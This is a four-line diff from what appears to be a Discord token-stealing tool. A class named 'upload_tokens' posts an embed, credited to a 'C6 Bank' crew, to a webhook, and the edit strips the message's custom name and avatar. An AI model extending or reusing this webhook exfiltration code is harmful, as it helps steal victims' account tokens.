@@ -369,4 +369,4 @@ class upload_tokens:
 
             embed.set_footer(text="@C6 Bank by t*#9009 and soup#2292")
 
-            self.webhook.send(embed=embed, username="Empresario do C6 bank", avatar_url="https://cdn.discordapp.com/attachments/1071430551745081356/1071567677799268442/sdasdad.png")
+            self.webhook.send(embed=embed)
